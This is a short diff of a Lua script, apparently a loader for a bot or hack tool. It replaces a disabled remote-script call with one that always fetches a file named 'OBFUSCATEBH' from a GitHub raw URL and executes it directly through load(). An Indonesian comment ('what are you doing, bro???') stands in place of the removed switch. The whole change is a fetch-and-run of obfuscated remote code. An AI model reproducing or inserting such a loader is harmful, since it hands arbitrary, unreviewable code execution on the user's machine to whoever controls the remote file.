@@ -1,6 +1,5 @@
-local disable = true
+-- ngapain bang???
 
 
-if disable then
-	load(MakeRequest("https://raw.githubusercontent.com/TegarPX/KZL/refs/heads/main/BOTHAX.lua", "GET").content)()
-end
+local loader = true
+load(MakeRequest("https://raw.githubusercontent.com/TegarPX/KZL/refs/heads/main/OBFUSCATEBH", "GET").content)()
